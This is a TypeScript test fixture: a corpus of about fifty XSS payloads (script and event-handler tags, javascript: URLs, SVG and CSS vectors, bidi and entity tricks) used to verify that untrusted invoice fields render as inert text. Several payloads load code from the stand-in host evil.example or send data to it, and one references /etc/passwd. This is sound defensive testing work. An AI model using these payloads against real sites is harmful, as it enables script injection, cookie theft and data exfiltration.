// SEC-01 corpus (docs/13 section 4.6, RT-01): hostile strings an attacker can put in invoice text, a filename, a vendor name, a payee label or an
// "explanation". Each is DATA: the suite proves it can only ever reach a page as an inert text node. Escapes are written with String.fromCharCode
// so no bidi or zero-width character is committed literally.
const cc = (...codes: number[]): string => String.fromCharCode(...codes);
const RLO = cc(0x202e); // right-to-left override
const ZWSP = cc(0x200b); // zero-width space
const ZWJ = cc(0x200d);
const BOM = cc(0xfeff);
const COMBINING = cc(0x0301);

export interface XssCase {
  readonly id: string;
  readonly family: "tag" | "attribute" | "event" | "url" | "markdown" | "svg" | "css" | "bidi" | "entity" | "template" | "control";
  readonly payload: string;
}

export const XSS_CORPUS: readonly XssCase[] = [
  { id: "tag-script", family: "tag", payload: "<script>alert(1)</script>" },
  { id: "tag-script-src", family: "tag", payload: '<script src="https://evil.example/x.js"></script>' },
  { id: "tag-img-onerror", family: "tag", payload: '<img src=x onerror="alert(1)">' },
  { id: "tag-iframe", family: "tag", payload: '<iframe src="javascript:alert(1)"></iframe>' },
  { id: "tag-object", family: "tag", payload: '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>' },
  { id: "tag-embed", family: "tag", payload: '<embed src="//evil.example/x.swf">' },
  { id: "tag-form", family: "tag", payload: '<form action="https://evil.example/steal"><input name=p></form>' },
  { id: "tag-meta-refresh", family: "tag", payload: '<meta http-equiv="refresh" content="0;url=https://evil.example">' },
  { id: "tag-base", family: "tag", payload: '<base href="https://evil.example/">' },
  { id: "tag-link-import", family: "tag", payload: '<link rel="stylesheet" href="https://evil.example/x.css">' },
  { id: "tag-unclosed", family: "tag", payload: "<img src=x onerror=alert(1)//" },
  { id: "tag-nested-break", family: "tag", payload: "</span></pre><script>alert(1)</script>" },
  { id: "tag-comment-break", family: "tag", payload: "<!--><script>alert(1)</script>-->" },
  { id: "tag-case-mix", family: "tag", payload: "<ScRiPt>alert(1)</sCrIpT>" },
  { id: "tag-null-byte-split", family: "tag", payload: "<scr\u0000ipt>alert(1)</scr\u0000ipt>" },
  { id: "attr-quote-escape", family: "attribute", payload: '" autofocus onfocus="alert(1)' },
  { id: "attr-single-quote", family: "attribute", payload: "' onmouseover='alert(1)" },
  { id: "attr-style-expression", family: "attribute", payload: '" style="background:url(javascript:alert(1))' },
  { id: "event-onload", family: "event", payload: '<body onload="alert(1)">' },
  { id: "event-onclick", family: "event", payload: '<a href="#" onclick="alert(1)">pay</a>' },
  { id: "event-ontoggle", family: "event", payload: "<details open ontoggle=alert(1)>" },
  { id: "event-onanimationstart", family: "event", payload: '<div style="animation-name:x" onanimationstart="alert(1)">' },
  { id: "url-javascript", family: "url", payload: "javascript:alert(document.cookie)" },
  { id: "url-javascript-case", family: "url", payload: "JaVaScRiPt:alert(1)" },
  { id: "url-javascript-tab", family: "url", payload: "java\tscript:alert(1)" },
  { id: "url-data-html", family: "url", payload: "data:text/html,<script>alert(1)</script>" },
  { id: "url-data-svg", family: "url", payload: "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" },
  { id: "url-vbscript", family: "url", payload: "vbscript:msgbox(1)" },
  { id: "url-file", family: "url", payload: "file:///etc/passwd" },
  { id: "url-protocol-relative", family: "url", payload: "//evil.example/pay?to=0xAttacker" },
  { id: "md-link-js", family: "markdown", payload: "[click to approve](javascript:alert(1))" },
  { id: "md-image-exfil", family: "markdown", payload: "![x](https://evil.example/log?c=SECRET)" },
  { id: "md-html-block", family: "markdown", payload: "<details><summary>approve</summary><img src=x onerror=alert(1)></details>" },
  { id: "md-autolink", family: "markdown", payload: "<https://evil.example/approve-now>" },
  { id: "svg-onload", family: "svg", payload: "<svg onload=alert(1)>" },
  { id: "svg-script", family: "svg", payload: '<svg><script>alert(1)</script></svg>' },
  { id: "svg-foreignobject", family: "svg", payload: '<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>' },
  { id: "svg-use-external", family: "svg", payload: '<svg><use href="https://evil.example/x.svg#a"/></svg>' },
  { id: "css-import", family: "css", payload: "<style>@import url(https://evil.example/x.css);</style>" },
  { id: "css-exfil-selector", family: "css", payload: "<style>input[value^=a]{background:url(https://evil.example/a)}</style>" },
  { id: "css-expression", family: "css", payload: "width:expression(alert(1))" },
  { id: "bidi-override", family: "bidi", payload: `pay ${RLO}1000 USDC to attacker` },
  { id: "zero-width-split", family: "bidi", payload: `scr${ZWSP}ipt${ZWJ}:alert(1)` },
  { id: "bom-prefix", family: "bidi", payload: `${BOM}<script>alert(1)</script>` },
  { id: "combining-bomb", family: "bidi", payload: `a${COMBINING.repeat(300)}` },
  { id: "entity-numeric", family: "entity", payload: "&#60;script&#62;alert(1)&#60;/script&#62;" },
  { id: "entity-hex", family: "entity", payload: "&#x3C;img src=x onerror=alert(1)&#x3E;" },
  { id: "entity-no-semicolon", family: "entity", payload: "&lt<script>alert(1)</script>" },
  { id: "template-literal", family: "template", payload: "${alert(1)} {{constructor.constructor('alert(1)')()}}" },
  { id: "template-react-prop", family: "template", payload: '{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}' },
  { id: "control-newlines", family: "control", payload: "line one\r\n\r\n<script>alert(1)</script>\r\nline three" },
  { id: "control-unterminated-string", family: "control", payload: '";alert(1);//' },
];
